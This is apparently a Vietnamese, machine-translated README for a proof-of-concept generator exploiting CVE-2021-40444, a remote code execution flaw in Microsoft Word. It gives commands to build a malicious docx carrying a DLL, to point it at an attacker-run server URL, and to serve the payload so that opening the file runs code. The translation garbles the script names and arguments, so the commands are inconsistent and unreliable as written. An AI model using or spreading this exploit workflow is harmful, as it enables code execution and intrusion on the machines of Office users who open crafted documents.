#CVE-2021-40444 PoC

Trình tạo docx độc hại để khai thác CVE-2021-40444 (Thực thi mã từ xa của Microsoft Office Word)

Việc tạo Tập lệnh này dựa trên một số kỹ thuật đảo ngược trên mẫu được sử dụng thực tế: 938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52 (tệp docx)

Trước tiên bạn cần cài đặt lcab (`sudo apt-get install lcab`)

Kiểm tra `REPRODUCE.md` để biết các bước sao chép thủ công

Nếu cab được tạo của bạn không hoạt động, hãy thử trỏ URL mining.html tới calc.cab

# Sử dụng

Trước tiên, hãy tạo một tài liệu docx độc hại có chứa một DLL, bạn có thể sử dụng tài liệu đó tại `test/calc.dll` để hiển thị `calc.exe` từ lệnh gọi tới `system()`

`python3 mining.py tạo test/calc.dll http://<SRV IP>`

![Tạo tài liệu](./img/gen.png)

Khi bạn tạo docx độc hại (sẽ ở `out/`), bạn có thể thiết lập máy chủ:

`sudo python3 khai thác.py máy chủ 80`

![Máy chủ](./img/srv.png)

Cuối cùng hãy thử docx trong Máy ảo Windows:

![Pop Calc](./img/calc.png)
